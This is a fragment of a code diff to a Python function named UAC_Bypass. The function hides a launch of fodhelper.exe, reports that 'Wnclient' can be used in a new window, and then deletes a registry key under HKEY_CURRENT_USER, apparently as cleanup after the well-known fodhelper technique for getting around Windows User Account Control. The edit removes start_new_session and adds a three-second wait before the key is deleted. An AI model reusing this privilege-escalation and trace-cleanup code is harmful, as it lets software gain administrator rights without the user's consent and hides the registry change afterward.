@@ -60,16 +60,16 @@ def UAC_Bypass():
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         startupinfo.wShowWindow = subprocess.SW_HIDE
         
-        subprocess.Popen([fodhelper_path], startupinfo=startupinfo, shell=True,start_new_session=True)
+        subprocess.Popen([fodhelper_path], startupinfo=startupinfo, shell=True)
         lwjgl.info("Create Success")
         lwjgl.info("You can use Wnclient in a new window")
         # remove reg
+        time.sleep(3)
         try:
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
             lwjgl.info("Registry key removed successfully")
         except WindowsError as e:
             lwjgl.error(f"Failed to remove registry key: {e}")
-
         sys.exit()
         
         
